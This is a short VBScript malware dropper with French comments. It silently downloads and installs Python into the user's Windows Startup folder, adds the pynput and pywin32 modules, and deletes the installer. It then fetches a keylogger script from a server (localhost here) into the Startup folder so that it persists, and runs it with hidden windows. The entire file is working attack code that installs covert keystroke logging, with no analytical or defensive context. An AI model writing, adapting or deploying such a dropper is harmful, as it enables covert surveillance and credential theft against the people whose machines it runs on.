Set oShell = CreateObject ("Wscript.Shell")

strUser = CreateObject("WScript.Network").UserName
pythonfolder="C:\Users\" + strUser + """\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\python.exe"""
pythonlink="""https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe"""
keyloggerlink="http://localhost:8000/Target/keylogger.pyw"
keyloggerfolder="C:\Users\" + strUser + """\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\file.pyw"""

'Téléchargement de python
oShell.run "cmd.exe /C curl -o " & pythonfolder & " " & pythonlink , 0, false
'Execution de python en mode silencieux
oShell.run "cmd.exe /C" & pythonfolder & " /quiet", 0, false
'Installation des modules
oShell.run "cmd .exe /C pip install pynput", 0, false
oShell.run "cmd .exe /C pip install pywin32", 0, false
'Suppression du fichier executable python
WScript.Sleep 10000
oShell.run "cmd.exe /C del " & pythonfolder
'Téléchargement du script python dans le dossier de démarrage
oShell.run "cmd.exe /C curl -o " & keyloggerfolder & " " & keyloggerlink, 0, false
'Execution du keylogger
oShell.run "cmd.exe /C python3 " & keyloggerfolder, 0, false